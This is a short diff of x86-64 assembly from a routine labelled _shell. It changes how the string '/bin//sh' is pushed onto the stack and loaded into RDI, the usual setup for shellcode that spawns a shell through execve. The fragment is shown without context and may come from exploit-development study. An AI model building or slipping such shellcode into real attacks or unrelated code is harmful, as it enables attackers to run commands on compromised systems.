@@ -212,8 +212,9 @@ _shell:
         xor eax, eax
         push rax
 
-        ; push /bin//sh in reverse
-        mov rbx, 0x68732f2f6e69622f
+        ; /bin//sh 
+        ; mov rbx, 0x68732f2f6e69622f	; not neccessary 
+	mov rbx, '/bin//sh'
         push rbx
 
         ; store /bin//sh address in RDI
